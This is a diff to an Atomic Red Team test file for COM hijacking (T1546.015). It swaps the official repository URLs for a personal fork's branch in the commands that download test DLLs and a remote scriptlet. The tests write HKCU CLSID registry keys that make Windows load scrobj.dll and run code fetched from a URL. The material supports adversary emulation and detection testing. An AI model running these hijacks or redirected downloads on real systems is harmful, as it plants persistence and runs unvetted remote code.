@@ -30,7 +30,7 @@ atomic_tests:
   dependencies:
   - description: DLL For testing
     prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
-    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
+    get_prereq_command: Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
   executor:
     command: |-
       New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
@@ -85,7 +85,7 @@ atomic_tests:
   dependencies:
   - description: DLL For testing
     prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
-    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
+    get_prereq_command: Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"
   executor:
     command: |-
       New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
@@ -121,7 +121,7 @@ atomic_tests:
       reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f
       reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
       reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
-      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1546.015/src/TreatAs.sct" /f
       reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f
 
       reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
